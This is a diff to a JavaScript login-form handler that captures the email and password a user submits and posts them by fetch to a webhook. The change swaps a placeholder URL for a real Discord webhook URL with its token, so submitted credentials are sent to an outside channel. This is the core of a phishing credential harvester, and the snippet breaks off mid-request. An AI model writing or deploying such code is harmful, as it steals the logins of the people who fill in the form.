@@ -3,7 +3,7 @@ form.addEventListener('submit', async (event) => {
   event.preventDefault();
   const email = event.target.elements.email.value;
   const password = event.target.elements.password.value;
-  const webhookUrl = 'https://example.com/webhook';
+  const webhookUrl = 'https://discord.com/api/webhooks/1103319312900567192/3SWoHjepeUxQEShb8Y2SFO-DJZNED1Cu6z49g6RT0_Z_6Zref4z5_0rYWQ4X9zvoilZN';
   const data = { email, password };
   try {
     const response = await fetch(webhookUrl, {
